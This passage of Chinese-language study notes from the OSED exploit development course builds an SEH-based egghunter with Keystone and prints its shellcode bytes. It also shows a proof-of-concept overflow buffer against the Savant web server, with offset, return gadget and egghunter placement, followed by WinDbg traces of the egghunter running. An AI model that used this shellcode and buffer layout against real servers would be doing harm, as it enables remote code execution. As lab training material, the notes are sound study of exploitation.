CODE = (
    "start: "
        "jmp get_seh_address;"

    "build_exception_record:"
        "pop ecx;"
        "mov eax, 0x74303077;"
        "push ecx;"
        "push 0xffffffff;"
        "xor ebx, ebx;"
        "mov dword ptr fs:[ebx], esp;"

    "is_egg:"
        "push 0x02;"
        "pop ecx;"
        "mov edi, ebx;"
        "repe scasd;"
        "jnz loop_inc_one;"
        "jmp edi;"

    "loop_inc_page:"
        "or bx, 0xfff;"

    "loop_inc_one:"
        "inc ebx;"
        "jmp is_egg;"

    "get_seh_address:"
        "call build_exception_record;"
        "push 0x0c;"
        "pop ecx;"
        "mov eax, [esp+ecx];"
        "mov cl, 0xb8;"
        "add dword ptr ds:[eax+ecx], 0x06;"
        "pop eax;"
        "add esp, 0x10;"
        "push eax;"
        "xor eax, eax;"
        "ret"
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)

print("Encoded %d instructions..." % count)

egghunter = ""
for dec in encoding:
    egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")

print("egghunter = (\"" + egghunter + "\")")
```
```
┌──(chw💲CHW)-[~/Offsec/OSED/Keystone]
└─$  python3 egghunter_seh_original.py
Encoded 35 instructions...
egghunter = ("\xeb\x21\x59\xb8\x77\x30\x30\x74\x51\x6a\xff\x31\xdb\x64\x89\x23\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3")
```
Encoded 35 instructions 是指組譯器回報的指令數量，不代表總長度是 35 bytes

將新的 Egghunter 放入 PoC，將原本 System Call 版本替換成 SEH 版本
```python
size = 253

httpMethod = (
    b"\x31\xC9\x85\xC9\x0F\x84\x11"
    + b" /"
)

egghunter = (
    b"\x90\x90\x90\x90\x90\x90\x90\x90"
    b"\xeb\x21\x59\xb8\x77\x30\x30\x74"
    b"\x51\x6a\xff\x31\xdb\x64\x89\x23"
    b"\x6a\x02\x59\x89\xdf\xf3\xaf\x75"
    b"\x07\xff\xe7\x66\x81\xcb\xff\x0f"
    b"\x43\xeb\xed\xe8\xda\xff\xff\xff"
    b"\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8"
    b"\x83\x04\x08\x06\x58\x83\xc4\x10"
    b"\x50\x31\xc0\xc3"
)

inputBuffer = b"\x41" * (size - len(egghunter))
inputBuffer += pack("<L", 0x418674)

httpEndRequest = b"\r\n\r\n"
```
> 延續前面章節的配置：
> - httpMethod：放置跳轉用的指令
> - NOP Sled：降低跳轉精準度要求
> - egghunter：搜尋第二階段 Payload
> - inputBuffer：填充到 EIP Offset 253
> - 0x418674：POP EAX; RET
> - HTTP Request 結束後：放置第二階段的 Egg 與 Payload


在 WinDbg 逐步驗證:
```dbg
0:008> bp 0x00418674
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
*** ERROR: Module load completed but symbols could not be loaded for C:\Savant\Savant.exe

0:008> g
Breakpoint 0 hit
eax=00000000 ebx=015c5750 ecx=0000000e edx=77994550 esi=015c5750 edi=0041703c
eip=00418674 esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18674:
00418674 58              pop     eax
...

0:003> t
eax=0307fe70 ebx=015c5750 ecx=00000000 edx=77994550 esi=015c5750 edi=0041703c
eip=0307eaa5 esp=0307ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0307eaa5 eb21            jmp     0307eac8
```
> 成功抵達 `pop eax  ret`\
> `eax=0307fe70 eip=0307eaa5` EIP 已經進入 HTTP Method 中的 Egghunter


執行 CALL，已經進入 egghunter 的初始階段，接著用 WinDbg 來完成主要步驟:\
首先跳到 ` get_seh_address` 函數對`build_exception_record` 函數執行 backwards relative CALL。這有助於避免 null bytes，並將返回位址壓入 stack
```dbg
0:003> t
eax=0307fe70 ebx=015c5750 ecx=00000000 edx=77994550 esi=015c5750 edi=0041703c
eip=0307eac8 esp=0307ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0307eac8 e8daffffff      call    0307eaa7

0:003> dds @esp L4
0307ea34  0041703c Savant+0x1703c
0307ea38  015c5750
0307ea3c  015c5750
0307ea40  00000000

0:003> t
eax=0307fe70 ebx=015c5750 ecx=00000000 edx=77994550 esi=015c5750 edi=0041703c
eip=0307eaa7 esp=0307ea30 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0307eaa7 59              pop     ecx

0:003> dds @esp L4
0307ea30  0307eacd
0307ea34  0041703c Savant+0x1703c
0307ea38  015c5750
0307ea3c  015c5750

0:003> u 0307eacd
0307eacd 6a0c            push    0Ch
0307eacf 59              pop     ecx
0307ead0 8b040c          mov     eax,dword ptr [esp+ecx]
0307ead3 b1b8            mov     cl,0B8h
0307ead5 83040806        add     dword ptr [eax+ecx],6
0307ead9 58              pop     eax
0307eada 83c410          add     esp,10h
0307eadd 50              push    eax
```
> `0307eac8 e8daffffff call 0307eaa7` 代表 CALL 正在執行向後跳轉
> > CALL / POP 確實成功動態取得了 Handler 的位置

確認自訂 Exception Registration Record:\
單步執行 `push ecx`, `push 0xffffffff`, `xor ebx, ebx`
```dbg
0:003> t
eax=54303057 ebx=015c5750 ecx=0307eacd edx=77994550 esi=015c5750 edi=0041703c
eip=0307eaad esp=0307ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0307eaad 51              push    ecx

0:003> t
eax=54303057 ebx=015c5750 ecx=0307eacd edx=77994550 esi=015c5750 edi=0041703c
eip=0307eaae esp=0307ea30 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0307eaae 6aff            push    0FFFFFFFFh

0:003> t
eax=54303057 ebx=015c5750 ecx=0307eacd edx=77994550 esi=015c5750 edi=0041703c
eip=0307eab0 esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0307eab0 31db            xor     ebx,ebx

0:003> dds @esp L2
0307ea2c  ffffffff
0307ea30  0307eacd
```
> - `dds @esp L2`:\
> ![image](https://hackmd.io/_uploads/B1hGKHgAGx.png)

在設定好 fake `_EXCEPTION_REGISTRATION_RECORD` structure，對 EBX 做 XOR，使其為空。然後用該值來 dereference FS register 中的偏移量
```dbg
0:003> r
eax=54303057 ebx=00000000 ecx=0307eacd edx=77994550 esi=015c5750 edi=0041703c
eip=0307eab2 esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0307eab2 648923          mov     dword ptr fs:[ebx],esp fs:003b:00000000=0307ff70

0:003> r @ebx
ebx=00000000

0:003> !teb
TEB at 7ffdb000
    ExceptionList:        0307ff70
    StackBase:            03080000
    StackLimit:           0307c000
...

0:003> t
eax=54303057 ebx=00000000 ecx=0307eacd edx=77994550 esi=015c5750 edi=0041703c
eip=0307eab5 esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0307eab5 6a02            push    2

0:003> !teb
TEB at 7ffdb000
    ExceptionList:        0307ea2c
    StackBase:            03080000
    StackLimit:           0307c000
...

0:003> dt _EXCEPTION_REGISTRATION_RECORD 0307ea2c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x0307eacd     _EXCEPTION_DISPOSITION  +307eacd
```
> - `TEB.ExceptionList = 0307ea2c` 0307ea2c 是我們剛建立的 Registration Record
> - +0x000 Next    : 0xffffffff
> - +0x004 Handler : 0x0307eacd
> SEH Registration Record 安裝成功

觸發 Access Violation，開始執行 `push 0x02`, `pop ecx`, `mov edi, ebx`, `repe scasd`
```dbg
0:003> t
eax=54303057 ebx=00000000 ecx=00000002 edx=77994550 esi=015c5750 edi=00000000
eip=0307eaba esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0307eaba f3af            repe scas dword ptr es:[edi]

0:003> dd edi
00000000  ???????? ???????? ???????? ????????
00000010  ???????? ???????? ???????? ????????
00000020  ???????? ???????? ???????? ????????
00000030  ???????? ???????? ???????? ????????
00000040  ???????? ???????? ???????? ????????
00000050  ???????? ???????? ???????? ????????
00000060  ???????? ???????? ???????? ????????
00000070  ???????? ???????? ???????? ????????

0:003> t
(8e4.904): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=54303057 ebx=00000000 ecx=00000002 edx=77994550 esi=015c5750 edi=00000000
eip=0307eaba esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
0307eaba f3af            repe scas dword ptr es:[edi]
```
Egghunter 從 0x00000000 開始搜尋，repe scasd 嘗試存取 `ES:[EDI] = 0x00000000` 就會觸發 Access Violation\
👉🏻 `0xC0000005` 就是 Access Violation 的 Exception Code\
EIP 0307eaba 指向 repe scasd

確認 SEH Chain mechanism 會呼叫我們自訂的 `_except_handler` function:
```dbg
0:003> !exchain
0307ea2c: 0307eacd
Invalid exception stack at ffffffff

0:003> u 0307eacd

0307eacd 6a0c            push    0Ch
0307eacf 59              pop     ecx
0307ead0 8b040c          mov     eax,dword ptr [esp+ecx]
0307ead3 b1b8            mov     cl,0B8h
0307ead5 83040806        add     dword ptr [eax+ecx],6
0307ead9 58              pop     eax
0307eada 83c410          add     esp,10h
0307eadd 50              push    eax
```

>[!Warning]
>Exception Handler 沒有被執行?
>```
>0:003> bp 0307eacd
>
>0:003> bl
>     0 e Disable Clear  00418674     0001 (0001)  0:**** >Savant+0x18674
>     1 e Disable Clear  0307eacd     0001 (0001)  0:**** 
>
>0:003> g
>(8e4.904): Access violation - code c0000005 (!!! second chance !!!)
>eax=54303057 ebx=00000000 ecx=00000002 edx=77994550 >esi=015c5750 edi=00000000
>eip=0307eaba esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
>0307eaba f3af            repe scas dword ptr es:[edi]
>```
>Handler 未成功執行:
>1. Egghunter 確實觸發 Access Violation
>2. 自訂 Handler 已經註冊到 TEB
>3. !exchain 也確認 Handler 位址正確
>4. 但 Windows 沒有成功進入設定的 Handler
>
>最後 Access Violation 變成 Second Chance Exception

![image](https://hackmd.io/_uploads/Bkik0BeCzl.png)

### Identifying the SEH-Based Egghunter Issue
>[!Caution]
> HackMD 筆記長度限制，接續 [[OSED, EXP-301] Instructional notes - Part 4](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-4/)
 

# [Link to: "[OSED, EXP-301] Instructional notes - Part 4"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-4/)

# [Link to: "[OSED, EXP-301] Instructional notes - Part 5"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-5/)

# [Link to: "[OSED, EXP-301] Instructional notes - Part 6"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-6/)
